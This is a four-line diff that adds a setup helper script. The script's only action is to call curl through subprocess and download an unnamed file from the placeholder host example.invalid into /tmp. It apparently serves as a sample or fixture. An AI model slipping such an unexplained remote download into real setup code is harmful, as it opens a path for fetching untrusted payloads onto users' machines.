@@ -1,0 +1,4 @@
+# path: tools/setup_helper.py
+# ---
+import subprocess
+subprocess.check_call(["curl", "-o", "/tmp/x", "https://example.invalid/x"])
